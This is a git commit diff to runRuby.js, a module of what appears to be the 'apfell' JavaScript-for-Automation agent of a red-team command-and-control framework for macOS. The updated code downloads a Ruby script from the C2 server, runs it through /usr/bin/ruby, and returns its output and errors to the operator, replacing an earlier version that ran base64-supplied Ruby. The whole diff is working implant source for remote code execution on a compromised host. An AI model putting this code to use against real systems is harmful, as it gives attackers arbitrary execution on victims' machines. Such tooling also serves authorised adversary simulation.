83b264a5963871518ed496f21d5d8ee1984cf657
RobotOperator <79430515+RobotOperator@users.noreply.github.com>
2025-05-06 01:24:22 -0400

    Update runRuby.js

--- Payload_Type/apfell/apfell/agent_code/runRuby.js
+++ Payload_Type/apfell/apfell/agent_code/runRuby.js
@@ -1,53 +1,56 @@
 exports.runRuby = function(task, command, params){
-//function runRuby(base64Input) {
-
-    try{
-    //Parse yaml to retrieve input
-    let pieces = JSON.parse(params);
-    let bInput = pieces['input'];
-    const decodedData = $.NSData.alloc.initWithBase64EncodedStringOptions(bInput, 0);
-    if (!decodedData) {
-        return {"user_output": "Failed to decode input.", "completed": true, "status": "error"};
-    }
-
-    const decodedString = $.NSString.alloc.initWithDataEncoding(decodedData, $.NSUTF8StringEncoding);
-    if (!decodedString) {
-        let response = "Decoded data is not valid UTF-8 text.";
-        return {"user_output": response, "completed": true, "status": "error"};
-    }
-
-    const inputData = decodedString.dataUsingEncoding($.NSUTF8StringEncoding);
-
-    // Prepare NSTask
-    const task = $.NSTask.alloc.init;
-    task.setLaunchPath("/usr/bin/ruby");
-    task.setArguments(["-"]);
-
-    // Set up input and output pipes
-    const inputPipe = $.NSPipe.pipe;
-    const outputPipe = $.NSPipe.pipe;
-
-    task.setStandardInput(inputPipe);
-    task.setStandardOutput(outputPipe);
-
-    // Write input to the process
-    const inputHandle = inputPipe.fileHandleForWriting;
-    inputHandle.writeData(inputData);
-    inputHandle.closeFile;
-
-    // Launch task
-    task.launch;
-    task.waitUntilExit;
-
-    // Read output
-    const outputHandle = outputPipe.fileHandleForReading;
-    const outputData = outputHandle.readDataToEndOfFile;
-    const outputString = $.NSString.alloc.initWithDataEncoding(outputData, $.NSUTF8StringEncoding);
-        
-    let response = ObjC.unwrap(outputString);
-    return {"user_output":response, "completed": true};
-
-    } catch(error){
+    //Parse JSON to retrieve input
+    let rubyscript = "";
+    try {
+    let config = JSON.parse(params);
+        let old_script_exists = jsimport === "";
+        if(config.hasOwnProperty("script")){
+            let ruby_data = C2.upload(task, config['script']);
+            if(typeof ruby_data === "string"){
+                return{"user_output":"Failed to get contents of file", "completed": true, "status": "error"};
+            }
+            rubyscript = $.NSString.alloc.initWithDataEncoding(ruby_data, $.NSUTF8StringEncoding);
+        }
+        else{
+            return {"user_output":"Need to supply a valid file to download", "completed": true, "status": "error"};
+        }
+        let rubyData = rubyscript.dataUsingEncoding($.NSUTF8StringEncoding);
+            // Prepare NSTask
+            let rubytask = $.NSTask.alloc.init;
+            rubytask.setLaunchPath("/usr/bin/ruby");
+            rubytask.setArguments(["-"]);
+            
+            // Set up input and output pipes
+            const inputPipe = $.NSPipe.pipe;
+            const outputPipe = $.NSPipe.pipe;
+            const errorPipe = $.NSPipe.pipe;
+            
+            rubytask.setStandardInput(inputPipe);
+            rubytask.setStandardOutput(outputPipe);
+            rubytask.setStandardError(errorPipe);
+            
+            // Write input to the process
+            const inputHandle = inputPipe.fileHandleForWriting;
+            inputHandle.writeData(rubyData);
+            inputHandle.closeFile;
+            
+            // Launch task
+            rubytask.launch;  
+            rubytask.waitUntilExit;
+            
+            // Read output
+            const outputHandle = outputPipe.fileHandleForReading;
+            const errorHandle = errorPipe.fileHandleForReading;
+            const outputData = outputHandle.readDataToEndOfFile;
+            const errorData = errorHandle.readDataToEndOfFile; 
+            const outputString = $.NSString.alloc.initWithDataEncoding(outputData, $.NSUTF8StringEncoding);
+            const errorString = $.NSString.alloc.initWithDataEncoding(errorData, $.NSUTF8StringEncoding);
+            // Aggregate Response
+            let response1 = ObjC.unwrap(outputString);
+            let response2 = ObjC.unwrap(errorString);
+            let response = response1 + response2;
+            return {"user_output":response, "completed": true};
+     }catch(error){
         return {"user_output":error.toString(), "completed": true, "status": "error"};
     }
 }
